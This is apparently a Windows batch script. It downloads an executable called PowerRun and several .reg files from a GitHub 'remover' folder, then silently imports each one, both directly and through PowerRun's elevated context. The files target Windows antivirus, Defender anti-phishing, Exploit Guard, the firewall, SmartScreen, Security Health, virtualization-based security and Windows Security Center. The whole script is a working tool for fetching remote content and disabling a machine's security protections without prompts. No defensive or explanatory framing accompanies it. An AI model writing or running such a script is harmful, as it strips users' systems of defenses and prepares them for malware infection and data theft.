
; get PowerRun
powershell -c iwr -uri "https://github.com/mesfet-sudo/PowerRun/releases/download/v1.0/PowerRun_x64.exe" -outfile "prun.exe"


; Get Registry keys files 
powershell -c iwr -uri "https://raw.githubusercontent.com/mesfet-sudo/PowerRun/main/remover/Antivirus.reg" -outfile "AV.reg"
powershell -c iwr -uri "https://raw.githubusercontent.com/mesfet-sudo/PowerRun/main/remover/DefenderAnti-Phishing.reg" -outfile "phish.reg"
powershell -c iwr -uri "https://raw.githubusercontent.com/mesfet-sudo/PowerRun/main/remover/ExploitGuard.reg" -outfile "gaurd.reg"
powershell -c iwr -uri "https://raw.githubusercontent.com/mesfet-sudo/PowerRun/main/remover/FirewallContextualMenuImplementation.reg" -outfile "fire.reg"
powershell -c iwr -uri "https://raw.githubusercontent.com/mesfet-sudo/PowerRun/main/remover/RuntimeIDs.reg" -outfile "runtime.reg"
powershell -c iwr -uri "https://raw.githubusercontent.com/mesfet-sudo/PowerRun/main/remover/SecurityHealth.reg" -outfile "health.reg"
powershell -c iwr -uri "https://raw.githubusercontent.com/mesfet-sudo/PowerRun/main/remover/SmartScreen.reg" -outfile "smart.reg"
powershell -c iwr -uri "https://raw.githubusercontent.com/mesfet-sudo/PowerRun/main/remover/Virtualization.reg" -outfile "virt.reg"
powershell -c iwr -uri "https://raw.githubusercontent.com/mesfet-sudo/PowerRun/main/remover/WindowsSecurityCenter.reg" -outfile "wsc.reg"


regedit.exe /s "AV.reg"
prun.exe regedit.exe /s "AV.reg"

regedit.exe /s "phish.reg"
prun.exe regedit.exe /s "phish.reg"

regedit.exe /s "gaurd.reg"
prun.exe regedit.exe /s "gaurd.reg"

regedit.exe /s "fire.reg"
prun.exe regedit.exe /s "fire.reg"

regedit.exe /s "runtime.reg"
prun.exe regedit.exe /s "runtime.reg"

regedit.exe /s "health.reg"
prun.exe regedit.exe /s "health.reg"

regedit.exe /s "smart.reg"
prun.exe regedit.exe /s "smart.reg"

regedit.exe /s "virt.reg"
prun.exe regedit.exe /s "virt.reg"

regedit.exe /s "wsc.reg"
prun.exe regedit.exe /s "wsc.reg"






